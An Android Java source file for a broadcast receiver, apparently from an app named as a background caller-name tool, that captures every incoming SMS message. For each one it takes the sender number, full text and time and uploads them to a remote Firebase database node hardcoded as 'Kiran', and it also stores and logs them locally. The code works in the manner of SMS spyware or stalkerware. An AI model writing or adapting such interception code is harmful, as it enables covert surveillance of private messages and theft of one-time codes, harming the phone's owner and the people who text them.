package com.prashant.backgroundcallername.BroadcastServices;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.prashant.backgroundcallername.Database.DatabaseHelper;
import com.prashant.backgroundcallername.Database.SMS_Database;
import com.prashant.backgroundcallername.Models.SMS_Model;

import java.util.Calendar;
import java.util.Date;

public class IncomingSms extends IncomingCall {
    final SmsManager sms = SmsManager.getDefault();
   DatabaseReference reference= FirebaseDatabase.getInstance().getReference().child("Kiran");
    public void onReceive(Context context, Intent intent) {

        final Bundle bundle = intent.getExtras();

        try {

            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdusObj.length; i++) {

                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();
                    Date currentTime = Calendar.getInstance().getTime();
                    String time= String.valueOf(currentTime);
                    String senderNum = phoneNumber;
                    String message = currentMessage.getDisplayMessageBody();


                    // Show Alert
                    int duration = Toast.LENGTH_LONG;
                    Toast toast = Toast.makeText(context, "Working " +"Sender Num : "+ senderNum + ", Msg: " + message+",currentTime :", duration);
                    toast.show();

                    SMS_Model model=new SMS_Model(senderNum,message,time);
                    String key = reference.push().getKey();
                    reference.child(key).setValue(model);
                    SMS_Database smsdb = new SMS_Database(context);

                    smsdb.addSMSDetails(message,senderNum, String.valueOf(currentTime));

                    Log.i("PRASHANT145", "=========  "  +senderNum);


                } // end for loop
            } // bundle is null

        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" +e);

        }
    }
}
